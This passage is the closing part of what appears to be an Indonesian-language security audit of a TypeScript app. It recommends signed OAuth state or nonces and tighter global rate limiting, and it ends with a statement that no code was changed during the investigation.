   - Gunakan HMAC signed state atau simpan nonce di cookie pengguna untuk memvalidasi callback Google OAuth.
5. **Penyesuaian Rate Limiting Global (`src/app.ts`)**:
   - Cabut pengecualian total (`allowList`) untuk rute publik dan webhook; terapkan batas kuota wajar untuk mencegah serangan DoS dan pengurasan kuota AI.

---

### Verifikasi Mandat Integritas
Audit ini disusun secara independen, objektif, dan berbasis bukti baris kode nyata tanpa asumsi permukaan. Tidak ada kode yang diubah secara terburu-buru selama proses investigasi, sesuai dengan **Strict Investigation Gate**.
